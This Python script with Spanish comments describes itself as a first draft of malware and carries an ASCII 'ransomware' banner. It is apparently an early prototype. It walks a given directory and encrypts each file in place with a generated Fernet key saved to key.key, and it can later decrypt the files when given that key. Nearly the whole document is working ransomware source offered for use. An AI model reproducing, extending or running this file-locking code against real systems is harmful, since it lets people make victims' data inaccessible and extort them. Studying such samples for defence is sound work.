"""
	Primera aproximacion de la solucion de un malware

	De momento encripta y desencripta un directorio pasado por argumento
	Introducir la opcion (-h) para mas ayuda
"""

import sys
import os
from cryptography.fernet import Fernet 

action = 'encrypt'


"""
	Funcion para mostrar el titulo con el nombre del programa
"""
def display_title():
	print('************************************************************************')
	print('____________    ____   __________   _______  _  _______ _______   ____  ')
	print('\_  __ \__  \  /    \ /  ___/  _ \ /     \ \/ \/ /\__  \\_  __ \_/ __ \ ')
	print(' |  | \// __ \|   |  \\___ (  <_> )  Y Y  \     /  / __ \|  | \/\  ___/ ')
	print(' |__|  (____  /___|  /____  >____/|__|_|  /\/\_/  (____  /__|    \___  >')
	print('            \/     \/     \/            \/             \/            \/ ')
	print('************************************************************************')

"""
	Funcion para mostrar el menu de ayuda
"""
def help():
	print('\t\t\t\tAYUDA')
	print('************************************************************************')
	print('(-p) Para introducir el path del directorio a encriptar o desencriptar.')
	print('(-a) Para decidir que accion realizar.')
	print('\t Introducir encrypt para encriptar.')
	print('\t Introducir decrypt para desencriptar.')
	print('(-k) Para introducir la clave para desencriptar.')
	print('************************************************************************')

"""
	Funcion para generar la clave simetrica y guardarla en un fichero llamado key.key
"""
def write_key():
	key = Fernet.generate_key()

	with open('key.key', 'wb') as key_file: 
		key_file.write(key)

"""
	Funcion para cargar la clave del fichero anteriormente guardado
"""
def load_key():
    return open("key.key", "rb").read()

"""
	Copiamos el contenido (str/bytes) encriptado en un nuevo archivo
"""
def encrypt(filename, key):
	f = Fernet(key)

	with open(filename, 'rb') as file:
		file_data = file.read()

	encrypted_data = f.encrypt(file_data)

	with open(filename, 'wb') as file:
		file.write(encrypted_data)

"""
	Proceso inverso a la anterior funcion. Volcamos el texto desencriptado a un nuevo archivo
"""
def decrypt(filename, key):
    f = Fernet(key)

    with open(filename, "rb") as file:
        encrypted_data = file.read()

    decrypted_data = f.decrypt(encrypted_data)

    with open(filename, "wb") as file:
        file.write(decrypted_data)

if __name__ == '__main__':

	display_title()

	print("Numero de argumentos introducidos: " + str(len(sys.argv)))
		
	try:
		# ayuda
		if (len(sys.argv) == 2) and (sys.argv[1] == '-h'):
			help()

		# encriptar
		elif (len(sys.argv) == 5) and (sys.argv[1] == '-p') and (sys.argv[3] == '-a'):
			path = sys.argv[2]
			action = sys.argv[4]
			if action.lower() == 'encrypt':
				files = os.listdir(path=path)
				write_key()
				key = load_key()
				for f in files:
					full_path = path + os.sep + f
					encrypt(full_path, key)
			else:
				raise Exception('Accion invalida')

		# desencriptar
		elif (len(sys.argv) == 7) and (sys.argv[1] == '-p') and (sys.argv[3] == '-a') and (sys.argv[5] == '-k'):
			path = sys.argv[2]
			action = sys.argv[4]
			if action.lower() == 'decrypt':
				files = os.listdir(path=path)
				key = sys.argv[6]
				for f in files:
					full_path = path + os.sep + f
					decrypt(full_path, key)
			else:
				raise Exception('Accion invalida')
		else:
			raise Exception('Argumentos mal introducidos\n\t(-h) Para mostrar el menu de ayuda')
	except Exception as e:
		print(e)